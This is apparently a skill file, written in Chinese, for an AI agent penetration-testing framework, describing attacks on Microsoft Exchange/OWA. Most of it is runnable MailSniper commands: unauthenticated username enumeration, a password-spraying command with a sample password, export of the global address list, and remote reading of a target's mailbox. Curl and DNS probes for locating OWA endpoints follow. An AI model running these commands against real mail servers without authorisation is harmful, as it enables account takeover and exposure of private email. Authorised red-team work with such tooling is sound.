---
name: 'exchange-owa-attacks'
description: 'Exchange/OWA攻击：MailSniper用户枚举+密码喷洒+全局地址簿导出。无AD凭据时的替代入口。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## Exchange / OWA 攻击

### 用户枚举（无需凭据）
```powershell
# MailSniper
Import-Module .\MailSniper.ps1
# 枚举有效用户
Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -Domain domain.local -UserList users.txt -OutFile valid.txt
# 密码喷洒
Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList valid.txt -Password Summer2025!
# 导出全局地址簿
Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\user -Password pass -OutFile gal.txt
```

### OWA 邮件读取
```bash
# 用有效凭据登录 OWA → 读邮件
# URL: https://mail.domain.com/owa/
# 或者用 MailSniper:
Invoke-SelfSearch -Mailbox target@domain.com -ExchHostname mail.domain.com -Remote
```

### 检测 OWA
```bash
# DNS 枚举
dig mx domain.com
dig autodiscover.domain.com
# HTTPS 探测
curl -k https://mail.domain.com/owa/
curl -k https://autodiscover.domain.com/autodiscover/autodiscover.xml
```

### 常见 Exchange 端口
- 443 (OWA/EWS/ECP)
- 25 (SMTP)
- 587 (SMTP TLS)
- 5985/5986 (WinRM on Exchange)
